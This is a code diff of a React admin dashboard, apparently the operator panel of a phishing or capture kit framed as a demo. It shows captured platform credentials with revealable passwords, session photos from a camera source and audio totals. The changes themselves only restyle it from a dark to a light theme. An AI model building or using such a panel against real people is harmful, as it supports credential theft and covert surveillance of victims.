@@ -34,14 +34,14 @@ const TABS = [
 ] as const;
 
 const PLATFORM_STYLES: Record<string, string> = {
-  instagram: 'bg-pink-500/15 text-pink-300 ring-pink-500/30',
-  facebook: 'bg-blue-500/15 text-blue-300 ring-blue-500/30',
-  twitter: 'bg-sky-500/15 text-sky-300 ring-sky-500/30',
-  linkedin: 'bg-cyan-500/15 text-cyan-300 ring-cyan-500/30',
-  gmail: 'bg-red-500/15 text-red-300 ring-red-500/30',
-  tiktok: 'bg-fuchsia-500/15 text-fuchsia-300 ring-fuchsia-500/30',
-  access: 'bg-emerald-500/15 text-emerald-300 ring-emerald-500/30',
-  camera: 'bg-emerald-500/15 text-emerald-300 ring-emerald-500/30',
+  instagram: 'bg-pink-50 text-pink-700 ring-pink-200',
+  facebook: 'bg-blue-50 text-blue-700 ring-blue-200',
+  twitter: 'bg-sky-50 text-sky-700 ring-sky-200',
+  linkedin: 'bg-cyan-50 text-cyan-700 ring-cyan-200',
+  gmail: 'bg-red-50 text-red-700 ring-red-200',
+  tiktok: 'bg-fuchsia-50 text-fuchsia-700 ring-fuchsia-200',
+  access: 'bg-emerald-50 text-emerald-700 ring-emerald-200',
+  camera: 'bg-emerald-50 text-emerald-700 ring-emerald-200',
 };
 
 function parsePhotoMetadata(metadata: string | null) {
@@ -104,7 +104,7 @@ function PhotoThumbnail({ photoId, token, alt }: { photoId: string; token: strin
 
   if (failed) {
     return (
-      <div className="flex h-full w-full flex-col items-center justify-center gap-2 bg-zinc-800 text-zinc-500">
+      <div className="flex h-full w-full flex-col items-center justify-center gap-2 bg-gray-100 text-gray-400">
         <ImageOff size={22} />
         <span className="text-xs">Unavailable</span>
       </div>
@@ -112,7 +112,7 @@ function PhotoThumbnail({ photoId, token, alt }: { photoId: string; token: strin
   }
 
   if (!src) {
-    return <div className="h-full w-full animate-pulse bg-zinc-800" />;
+    return <div className="h-full w-full animate-pulse bg-gray-100" />;
   }
 
   return <img src={src} alt={alt} className="h-full w-full object-cover" />;
@@ -158,13 +158,13 @@ export default function AdminDashboard() {
         return;
       }
 
-      const visiblePhotos = sessionFilter === 'all' ? photos : photos.filter((photo) => photo.session_id === sessionFilter);
-      const currentIndex = visiblePhotos.findIndex((photo) => photo.id === selectedPhoto.id);
-      if (event.key === 'ArrowRight' && currentIndex < visiblePhotos.length - 1) {
-        setSelectedPhoto(visiblePhotos[currentIndex + 1]);
+      const currentPhotos = sessionFilter === 'all' ? photos : photos.filter((photo) => photo.session_id === sessionFilter);
+      const currentIndex = currentPhotos.findIndex((photo) => photo.id === selectedPhoto.id);
+      if (event.key === 'ArrowRight' && currentIndex < currentPhotos.length - 1) {
+        setSelectedPhoto(currentPhotos[currentIndex + 1]);
       }
       if (event.key === 'ArrowLeft' && currentIndex > 0) {
-        setSelectedPhoto(visiblePhotos[currentIndex - 1]);
+        setSelectedPhoto(currentPhotos[currentIndex - 1]);
       }
     };
 
@@ -261,9 +261,9 @@ export default function AdminDashboard() {
 
   if (isLoading && !credentials.length && !photos.length) {
     return (
-      <div className="flex min-h-screen items-center justify-center bg-zinc-950 text-zinc-300">
+      <div className="flex min-h-screen items-center justify-center bg-linear-to-br from-purple-50 to-blue-50 text-gray-600">
         <div className="text-center">
-          <div className="mx-auto mb-4 h-10 w-10 animate-spin rounded-full border-2 border-violet-400 border-t-transparent" />
+          <div className="mx-auto mb-4 h-10 w-10 animate-spin rounded-full border-2 border-purple-500 border-t-transparent" />
           <p>Loading dashboard...</p>
         </div>
       </div>
@@ -271,22 +271,22 @@ export default function AdminDashboard() {
   }
 
   return (
-    <div className="min-h-screen bg-zinc-950 text-zinc-100">
-      <header className="sticky top-0 z-40 border-b border-white/10 bg-zinc-950/80 backdrop-blur">
+    <div className="min-h-screen bg-linear-to-br from-purple-50 to-blue-50 text-gray-800">
+      <header className="sticky top-0 z-40 border-b border-purple-100 bg-white/90 backdrop-blur">
         <div className="mx-auto flex max-w-7xl items-center justify-between gap-4 px-4 py-4">
           <div className="flex items-center gap-3">
-            <div className="flex h-11 w-11 items-center justify-center rounded-xl bg-violet-500/15 text-violet-300 ring-1 ring-violet-400/30">
+            <div className="flex h-11 w-11 items-center justify-center rounded-xl bg-purple-100 text-purple-700">
               <Shield size={22} />
             </div>
             <div>
               <div className="flex items-center gap-2">
-                <h1 className="text-xl font-semibold tracking-tight text-white">CyberX Monitor</h1>
-                <span className="inline-flex items-center gap-1 rounded-full bg-emerald-500/15 px-2 py-0.5 text-[11px] font-medium text-emerald-300 ring-1 ring-emerald-400/20">
-                  <span className="h-1.5 w-1.5 animate-pulse rounded-full bg-emerald-400" />
+                <h1 className="text-xl font-semibold tracking-tight text-gray-900">CyberX Admin</h1>
+                <span className="inline-flex items-center gap-1 rounded-full bg-green-50 px-2 py-0.5 text-[11px] font-medium text-green-700 ring-1 ring-green-200">
+                  <span className="h-1.5 w-1.5 animate-pulse rounded-full bg-green-500" />
                   Live
                 </span>
               </div>
-              <p className="text-xs text-zinc-400">
+              <p className="text-xs text-gray-500">
                 {lastUpdated ? `Updated ${lastUpdated.toLocaleTimeString()}` : 'Waiting for first refresh'}
               </p>
             </div>
@@ -295,14 +295,14 @@ export default function AdminDashboard() {
           <div className="flex items-center gap-2">
             <button
               onClick={() => void loadData()}
-              className="inline-flex items-center gap-2 rounded-lg bg-white/5 px-3 py-2 text-sm text-zinc-200 ring-1 ring-white/10 transition hover:bg-white/10"
+              className="inline-flex items-center gap-2 rounded-lg bg-blue-600 px-3 py-2 text-sm text-white transition hover:bg-blue-700"
             >
               <RefreshCw size={16} className={isRefreshing ? 'animate-spin' : ''} />
               Refresh
             </button>
             <button
               onClick={handleLogout}
-              className="inline-flex items-center gap-2 rounded-lg bg-white/5 px-3 py-2 text-sm text-zinc-200 ring-1 ring-white/10 transition hover:bg-white/10"
+              className="inline-flex items-center gap-2 rounded-lg bg-gray-700 px-3 py-2 text-sm text-white transition hover:bg-gray-800"
             >
               <LogOut size={16} />
               Logout
@@ -314,25 +314,25 @@ export default function AdminDashboard() {
       <main className="mx-auto max-w-7xl px-4 py-8">
         <section className="mb-8 grid grid-cols-1 gap-4 sm:grid-cols-2 xl:grid-cols-4">
           {[
-            { label: 'Active Sessions', value: analytics?.activeSessions || sessions.length || 0, icon: Activity, tone: 'text-sky-300 bg-sky-500/10 ring-sky-400/20' },
-            { label: 'Credentials', value: analytics?.totalCredentials || credentials.length || 0, icon: KeyRound, tone: 'text-rose-300 bg-rose-500/10 ring-rose-400/20' },
-            { label: 'Photos', value: analytics?.totalPhotos || photos.length || 0, icon: Camera, tone: 'text-emerald-300 bg-emerald-500/10 ring-emerald-400/20' },
-            { label: 'Audio', value: `${analytics?.totalAudioMinutes || 0}m`, icon: Clock3, tone: 'text-violet-300 bg-violet-500/10 ring-violet-400/20' },
+            { label: 'Active Sessions', value: analytics?.activeSessions || sessions.length || 0, icon: Activity, tone: 'text-blue-600 bg-blue-50' },
+            { label: 'Credentials', value: analytics?.totalCredentials || credentials.length || 0, icon: KeyRound, tone: 'text-red-600 bg-red-50' },
+            { label: 'Photos', value: analytics?.totalPhotos || photos.length || 0, icon: Camera, tone: 'text-green-600 bg-green-50' },
+            { label: 'Audio', value: `${analytics?.totalAudioMinutes || 0}m`, icon: Clock3, tone: 'text-purple-600 bg-purple-50' },
           ].map((card) => (
-            <div key={card.label} className="rounded-2xl border border-white/10 bg-zinc-900/70 p-5 shadow-xl shadow-black/20">
+            <div key={card.label} className="rounded-2xl border border-purple-100 bg-white p-5 shadow-sm">
               <div className="flex items-center justify-between">
-                <p className="text-sm text-zinc-400">{card.label}</p>
-                <div className={`rounded-lg p-2 ring-1 ${card.tone}`}>
+                <p className="text-sm text-gray-500">{card.label}</p>
+                <div className={`rounded-lg p-2 ${card.tone}`}>
                   <card.icon size={18} />
                 </div>
               </div>
-              <p className="mt-4 text-3xl font-semibold tracking-tight text-white">{card.value}</p>
+              <p className="mt-4 text-3xl font-semibold tracking-tight text-gray-900">{card.value}</p>
             </div>
           ))}
         </section>
 
-        <section className="overflow-hidden rounded-2xl border border-white/10 bg-zinc-900/70 shadow-xl shadow-black/20">
-          <div className="flex gap-1 overflow-x-auto border-b border-white/10 p-2">
+        <section className="overflow-hidden rounded-2xl border border-purple-100 bg-white shadow-sm">
+          <div className="flex gap-1 overflow-x-auto border-b border-gray-100 p-2">
             {TABS.map((tab) => {
               const count =
                 tab.id === 'credentials'
@@ -350,12 +350,12 @@ export default function AdminDashboard() {
                   key={tab.id}
                   onClick={() => setActiveTab(tab.id)}
                   className={`inline-flex items-center gap-2 rounded-xl px-4 py-2.5 text-sm font-medium transition ${
-                    isActive ? 'bg-violet-500 text-white' : 'text-zinc-400 hover:bg-white/5 hover:text-zinc-100'
+                    isActive ? 'bg-purple-600 text-white' : 'text-gray-500 hover:bg-purple-50 hover:text-gray-900'
                   }`}
                 >
                   <Icon size={16} />
                   {tab.label}
-                  <span className={`rounded-full px-1.5 py-0.5 text-[11px] ${isActive ? 'bg-white/20' : 'bg-white/5'}`}>
+                  <span className={`rounded-full px-1.5 py-0.5 text-[11px] ${isActive ? 'bg-white/20' : 'bg-gray-100'}`}>
                     {count}
                   </span>
                 </button>
@@ -367,8 +367,8 @@ export default function AdminDashboard() {
             <div className="p-4 md:p-6">
               {credentials.length ? (
                 <div className="overflow-x-auto">
-                    <table className="w-full min-w-180 text-left text-sm">
-                    <thead className="text-xs uppercase tracking-wide text-zinc-500">
+                  <table className="w-full min-w-180 text-left text-sm">
+                    <thead className="text-xs uppercase tracking-wide text-gray-500">
                       <tr>
                         <th className="px-3 py-3">Platform</th>
                         <th className="px-3 py-3">Email / Username</th>
@@ -386,28 +386,28 @@ export default function AdminDashboard() {
                         const platform = String(cred.demo_type || 'unknown').toLowerCase();
 
                         return (
-                          <tr key={cred.id || idx} className="border-t border-white/5 hover:bg-white/5">
+                          <tr key={cred.id || idx} className="border-t border-gray-100 hover:bg-purple-50/60">
                             <td className="px-3 py-3">
-                              <span className={`inline-flex rounded-full px-2.5 py-1 text-xs font-medium ring-1 ${PLATFORM_STYLES[platform] || 'bg-zinc-700/50 text-zinc-300 ring-white/10'}`}>
+                              <span className={`inline-flex rounded-full px-2.5 py-1 text-xs font-medium ring-1 ${PLATFORM_STYLES[platform] || 'bg-gray-100 text-gray-700 ring-gray-200'}`}>
                                 {cred.demo_type || 'unknown'}
                               </span>
                             </td>
-                            <td className="px-3 py-3 font-medium text-zinc-100">{cred.email_or_username}</td>
+                            <td className="px-3 py-3 font-medium text-gray-900">{cred.email_or_username}</td>
                             <td className="px-3 py-3">
                               <div className="flex items-center gap-2">
-                                <code className="rounded-md bg-zinc-800 px-2 py-1 text-xs text-zinc-200">{passwordDisplay}</code>
+                                <code className="rounded-md bg-gray-100 px-2 py-1 text-xs text-gray-800">{passwordDisplay}</code>
                                 <button
                                   type="button"
                                   onClick={() => togglePasswordVisibility(cred.id)}
-                                  className="rounded-md p-1.5 text-zinc-400 transition hover:bg-white/10 hover:text-white"
+                                  className="rounded-md p-1.5 text-gray-500 transition hover:bg-gray-100 hover:text-gray-900"
                                   aria-label={isPasswordVisible ? 'Hide password' : 'Show password'}
                                 >
                                   {isPasswordVisible ? <EyeOff size={16} /> : <Eye size={16} />}
                                 </button>
                               </div>
                             </td>
-                            <td className="px-3 py-3 text-xs text-zinc-400">{formatTime(cred.captured_at)}</td>
-                            <td className="px-3 py-3 font-mono text-xs text-zinc-500">{cred.session_id?.slice(-8)}</td>
+                            <td className="px-3 py-3 text-xs text-gray-500">{formatTime(cred.captured_at)}</td>
+                            <td className="px-3 py-3 font-mono text-xs text-gray-500">{cred.session_id?.slice(-8)}</td>
                           </tr>
                         );
                       })}
@@ -424,31 +424,31 @@ export default function AdminDashboard() {
             <div className="grid gap-4 p-4 md:grid-cols-2 md:p-6">
               {sessions.length ? (
                 sessions.map((session) => (
-                  <div key={session.id} className="rounded-2xl border border-white/10 bg-zinc-950/60 p-4">
+                  <div key={session.id} className="rounded-2xl border border-gray-100 bg-gray-50 p-4">
                     <div className="flex items-start justify-between gap-3">
                       <div>
-                        <p className="font-mono text-sm text-white">Session {session.id?.slice(-8)}</p>
-                        <p className="mt-1 text-xs text-zinc-500">{session.id}</p>
+                        <p className="font-mono text-sm text-gray-900">Session {session.id?.slice(-8)}</p>
+                        <p className="mt-1 text-xs text-gray-500">{session.id}</p>
                       </div>
                       <span className={`rounded-full px-2.5 py-1 text-xs font-medium ring-1 ${
                         session.status === 'active'
-                          ? 'bg-emerald-500/15 text-emerald-300 ring-emerald-400/20'
-                          : 'bg-zinc-700/50 text-zinc-300 ring-white/10'
+                          ? 'bg-green-50 text-green-700 ring-green-200'
+                          : 'bg-gray-100 text-gray-600 ring-gray-200'
                       }`}>
                         {session.status || 'unknown'}
                       </span>
                     </div>
                     <div className="mt-4 grid grid-cols-2 gap-3 text-sm">
-                      <div className="rounded-xl bg-white/5 px-3 py-2">
-                        <p className="text-xs text-zinc-500">Photos</p>
-                        <p className="font-semibold text-white">{session.photo_count || 0}</p>
+                      <div className="rounded-xl bg-white px-3 py-2">
+                        <p className="text-xs text-gray-500">Photos</p>
+                        <p className="font-semibold text-gray-900">{session.photo_count || 0}</p>
                       </div>
-                      <div className="rounded-xl bg-white/5 px-3 py-2">
-                        <p className="text-xs text-zinc-500">Audio</p>
-                        <p className="font-semibold text-white">{session.audio_duration_ms || 0}ms</p>
+                      <div className="rounded-xl bg-white px-3 py-2">
+                        <p className="text-xs text-gray-500">Audio</p>
+                        <p className="font-semibold text-gray-900">{session.audio_duration_ms || 0}ms</p>
                       </div>
                     </div>
-                    <p className="mt-3 text-xs text-zinc-500">{formatTime(session.created_at)}</p>
+                    <p className="mt-3 text-xs text-gray-500">{formatTime(session.created_at)}</p>
                   </div>
                 ))
               ) : (
@@ -469,8 +469,8 @@ export default function AdminDashboard() {
                       onClick={() => setSessionFilter('all')}
                       className={`rounded-full px-3 py-1.5 text-xs font-medium ring-1 transition ${
                         sessionFilter === 'all'
-                          ? 'bg-violet-500 text-white ring-violet-400/40'
-                          : 'bg-white/5 text-zinc-300 ring-white/10 hover:bg-white/10'
+                          ? 'bg-purple-600 text-white ring-purple-600'
+                          : 'bg-white text-gray-600 ring-gray-200 hover:bg-purple-50'
                       }`}
                     >
                       All sessions · {photos.length}
@@ -482,8 +482,8 @@ export default function AdminDashboard() {
                         onClick={() => setSessionFilter(sessionId)}
                         className={`rounded-full px-3 py-1.5 text-xs font-medium ring-1 transition ${
                           sessionFilter === sessionId
-                            ? 'bg-violet-500 text-white ring-violet-400/40'
-                            : 'bg-white/5 text-zinc-300 ring-white/10 hover:bg-white/10'
+                            ? 'bg-purple-600 text-white ring-purple-600'
+                            : 'bg-white text-gray-600 ring-gray-200 hover:bg-purple-50'
                         }`}
                       >
                         {sessionId.slice(-8)} · {photos.filter((photo) => photo.session_id === sessionId).length}
@@ -501,7 +501,7 @@ export default function AdminDashboard() {
                           key={photo.id}
                           type="button"
                           onClick={() => setSelectedPhoto(photo)}
-                          className="group overflow-hidden rounded-2xl border border-white/10 bg-zinc-950 text-left transition hover:-translate-y-0.5 hover:border-violet-400/40 hover:shadow-lg hover:shadow-violet-950/40"
+                          className="group overflow-hidden rounded-2xl border border-gray-200 bg-white text-left shadow-sm transition hover:-translate-y-0.5 hover:border-purple-300 hover:shadow-md"
                         >
                           <div className="relative aspect-4/3 overflow-hidden">
                             <div className="h-full w-full transition duration-300 group-hover:scale-105">
@@ -511,9 +511,9 @@ export default function AdminDashboard() {
                                 alt={`Capture from session ${photo.session_id}`}
                               />
                             </div>
-                            <div className="absolute inset-x-0 bottom-0 bg-linear-to-t from-black/80 via-black/30 to-transparent p-3">
+                            <div className="absolute inset-x-0 bottom-0 bg-linear-to-t from-black/70 via-black/20 to-transparent p-3">
                               <p className="text-sm font-medium text-white capitalize">{source}</p>
-                              <p className="text-[11px] text-zinc-300">{formatTime(photo.capture_timestamp)}</p>
+                              <p className="text-[11px] text-white/80">{formatTime(photo.capture_timestamp)}</p>
                             </div>
                           </div>
                         </button>
@@ -529,45 +529,45 @@ export default function AdminDashboard() {
 
           {activeTab === 'analytics' && (
             <div className="grid gap-6 p-4 md:grid-cols-2 md:p-6">
-              <div className="rounded-2xl border border-white/10 bg-zinc-950/60 p-5">
-                <h3 className="mb-4 text-sm font-semibold text-white">Credentials by platform</h3>
+              <div className="rounded-2xl border border-gray-100 bg-gray-50 p-5">
+                <h3 className="mb-4 text-sm font-semibold text-gray-900">Credentials by platform</h3>
                 <div className="space-y-3">
                   {Object.keys(platformCounts).length ? (
                     Object.entries(platformCounts).map(([platform, count]) => (
                       <div key={platform}>
                         <div className="mb-1 flex items-center justify-between text-sm">
-                          <span className="capitalize text-zinc-300">{platform}</span>
-                          <span className="font-semibold text-white">{String(count)}</span>
+                          <span className="capitalize text-gray-600">{platform}</span>
+                          <span className="font-semibold text-gray-900">{String(count)}</span>
                         </div>
-                        <div className="h-2 overflow-hidden rounded-full bg-white/5">
+                        <div className="h-2 overflow-hidden rounded-full bg-white">
                           <div
-                            className="h-full rounded-full bg-violet-500"
+                            className="h-full rounded-full bg-purple-500"
                             style={{ width: `${(Number(count) / maxPlatformCount) * 100}%` }}
                           />
                         </div>
                       </div>
                     ))
                   ) : (
-                    <p className="text-sm text-zinc-500">No platform data yet.</p>
+                    <p className="text-sm text-gray-500">No platform data yet.</p>
                   )}
                 </div>
               </div>
-              <div className="rounded-2xl border border-white/10 bg-zinc-950/60 p-5">
-                <h3 className="mb-4 text-sm font-semibold text-white">Session stats</h3>
+              <div className="rounded-2xl border border-gray-100 bg-gray-50 p-5">
+                <h3 className="mb-4 text-sm font-semibold text-gray-900">Session stats</h3>
                 <div className="space-y-3 text-sm">
-                  <div className="flex items-center justify-between rounded-xl bg-white/5 px-3 py-3">
-                    <span className="text-zinc-400">Total sessions</span>
-                    <span className="font-semibold text-white">{sessions.length}</span>
+                  <div className="flex items-center justify-between rounded-xl bg-white px-3 py-3">
+                    <span className="text-gray-500">Total sessions</span>
+                    <span className="font-semibold text-gray-900">{sessions.length}</span>
                   </div>
-                  <div className="flex items-center justify-between rounded-xl bg-white/5 px-3 py-3">
-                    <span className="text-zinc-400">Photos / session</span>
-                    <span className="font-semibold text-white">
+                  <div className="flex items-center justify-between rounded-xl bg-white px-3 py-3">
+                    <span className="text-gray-500">Photos / session</span>
+                    <span className="font-semibold text-gray-900">
                       {sessions.length ? (photos.length / sessions.length).toFixed(1) : '0'}
                     </span>
                   </div>
-                  <div className="flex items-center justify-between rounded-xl bg-white/5 px-3 py-3">
-                    <span className="text-zinc-400">Credentials / session</span>
-                    <span className="font-semibold text-white">
+                  <div className="flex items-center justify-between rounded-xl bg-white px-3 py-3">
+                    <span className="text-gray-500">Credentials / session</span>
+                    <span className="font-semibold text-gray-900">
                       {sessions.length ? (credentials.length / sessions.length).toFixed(1) : '0'}
                     </span>
                   </div>
@@ -577,16 +577,16 @@ export default function AdminDashboard() {
           )}
         </section>
 
-        <section className="mt-6 rounded-2xl border border-red-500/20 bg-red-500/5 p-5">
-          <h2 className="text-lg font-semibold text-white">Data management</h2>
-          <p className="mt-1 text-sm text-zinc-400">
+        <section className="mt-6 rounded-2xl border border-red-200 bg-red-50 p-5">
+          <h2 className="text-lg font-semibold text-gray-900">Data management</h2>
+          <p className="mt-1 text-sm text-gray-600">
             This permanently deletes captured sessions, credentials, and photo records from the demo database.
           </p>
           <div className="mt-4 flex flex-wrap gap-3">
             <button
               onClick={() => void handleDeleteAllData()}
               className={`inline-flex items-center gap-2 rounded-lg px-4 py-2.5 text-sm font-medium text-white transition ${
-                deleteConfirm ? 'bg-red-600 hover:bg-red-500' : 'bg-zinc-800 hover:bg-zinc-700'
+                deleteConfirm ? 'bg-red-600 hover:bg-red-700' : 'bg-gray-700 hover:bg-gray-800'
               }`}
             >
               <Trash2 size={16} />
@@ -595,7 +595,7 @@ export default function AdminDashboard() {
             {deleteConfirm && (
               <button
                 onClick={() => setDeleteConfirm(false)}
-                className="rounded-lg bg-white/5 px-4 py-2.5 text-sm text-zinc-200 ring-1 ring-white/10 hover:bg-white/10"
+                className="rounded-lg bg-white px-4 py-2.5 text-sm text-gray-700 ring-1 ring-gray-200 hover:bg-gray-50"
               >
                 Cancel
               </button>
@@ -606,40 +606,40 @@ export default function AdminDashboard() {
 
       {selectedPhoto && (
         <div
-          className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 p-4 backdrop-blur-sm"
+          className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4"
           onClick={() => setSelectedPhoto(null)}
         >
           <div
-            className="relative w-full max-w-4xl overflow-hidden rounded-2xl border border-white/10 bg-zinc-950 shadow-2xl"
+            className="relative w-full max-w-4xl overflow-hidden rounded-2xl bg-white shadow-2xl"
             onClick={(event) => event.stopPropagation()}
           >
             <button
               type="button"
               onClick={() => setSelectedPhoto(null)}
-              className="absolute right-3 top-3 z-10 rounded-full bg-black/60 p-2 text-white hover:bg-black/80"
+              className="absolute right-3 top-3 z-10 rounded-full bg-white p-2 text-gray-700 shadow hover:bg-gray-100"
               aria-label="Close photo"
             >
               <X size={18} />
             </button>
-            <div className="aspect-16/10 bg-black">
+            <div className="aspect-16/10 bg-gray-100">
               <PhotoThumbnail
                 photoId={selectedPhoto.id}
                 token={adminToken}
                 alt={`Full capture from session ${selectedPhoto.session_id}`}
               />
             </div>
-            <div className="grid gap-3 p-4 text-sm text-zinc-300 sm:grid-cols-3">
-              <div className="rounded-xl bg-white/5 px-3 py-2">
-                <p className="text-[11px] uppercase tracking-wide text-zinc-500">Session</p>
-                <p className="truncate font-mono text-white">{selectedPhoto.session_id}</p>
+            <div className="grid gap-3 p-4 text-sm text-gray-700 sm:grid-cols-3">
+              <div className="rounded-xl bg-gray-50 px-3 py-2">
+                <p className="text-[11px] uppercase tracking-wide text-gray-500">Session</p>
+                <p className="truncate font-mono text-gray-900">{selectedPhoto.session_id}</p>
               </div>
-              <div className="rounded-xl bg-white/5 px-3 py-2">
-                <p className="text-[11px] uppercase tracking-wide text-zinc-500">Source</p>
-                <p className="capitalize text-white">{parsePhotoMetadata(selectedPhoto.metadata).source || 'camera'}</p>
+              <div className="rounded-xl bg-gray-50 px-3 py-2">
+                <p className="text-[11px] uppercase tracking-wide text-gray-500">Source</p>
+                <p className="capitalize text-gray-900">{parsePhotoMetadata(selectedPhoto.metadata).source || 'camera'}</p>
               </div>
-              <div className="rounded-xl bg-white/5 px-3 py-2">
-                <p className="text-[11px] uppercase tracking-wide text-zinc-500">Captured</p>
-                <p className="text-white">{formatTime(selectedPhoto.capture_timestamp)}</p>
+              <div className="rounded-xl bg-gray-50 px-3 py-2">
+                <p className="text-[11px] uppercase tracking-wide text-gray-500">Captured</p>
+                <p className="text-gray-900">{formatTime(selectedPhoto.capture_timestamp)}</p>
               </div>
             </div>
           </div>
@@ -651,9 +651,9 @@ export default function AdminDashboard() {
 
 function EmptyState({ title, body }: { title: string; body: string }) {
   return (
-    <div className="rounded-2xl border border-dashed border-white/10 px-6 py-16 text-center">
-      <p className="text-base font-medium text-white">{title}</p>
-      <p className="mt-1 text-sm text-zinc-500">{body}</p>
+    <div className="rounded-2xl border border-dashed border-gray-200 px-6 py-16 text-center">
+      <p className="text-base font-medium text-gray-900">{title}</p>
+      <p className="mt-1 text-sm text-gray-500">{body}</p>
     </div>
   );
 }
